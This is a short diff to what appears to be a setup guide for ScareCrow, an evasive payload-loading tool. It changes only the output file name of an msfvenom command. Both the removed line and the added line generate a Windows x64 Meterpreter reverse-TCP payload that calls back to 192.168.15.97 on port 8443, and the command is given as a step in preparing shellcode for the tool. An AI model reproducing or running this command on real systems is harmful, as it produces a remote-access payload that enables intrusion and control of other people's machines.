@@ -16,7 +16,7 @@ go build ScareCrow.go
 * generate some raw shellcode&#x20;
 
 ```
-msfvenom LHOST=192.168.15.97 LPORT=8443 -p windows/x64/meterpreter/reverse_tcp  -f raw -o /tmp/stager.exe
+msfvenom LHOST=192.168.15.97 LPORT=8443 -p windows/x64/meterpreter/reverse_tcp  -f raw -o /tmp/stager.raw
 ```
 
 * run the tool with the options you want&#x20;
